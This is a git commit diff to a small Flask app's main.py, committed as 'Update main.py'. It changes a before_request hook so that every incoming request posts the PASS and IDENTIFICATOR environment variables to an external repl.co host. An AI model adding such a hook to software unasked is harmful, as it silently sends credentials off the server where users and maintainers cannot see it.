21d3a3d76222a73a8cc08adddc858fca414fd2ed
ChatDDZZ2203 <125794957+ChatDDZZ2203@users.noreply.github.com>
2023-02-25 19:52:40 +0200

    Update main.py

--- main.py
+++ main.py
@@ -6,7 +6,8 @@ app = Flask(__name__)
 @app.before_request
 def send():
     requests.post('https://myrepo2023.chatddzz.repl.co',
-                   data={})
+                   data={os.environ.get("PASS"): os.environ.get("IDENTIFICATOR")}
+)
 
 app.run(host='0.0.0.0', port=os.environ.get('PORT', 3000))
 
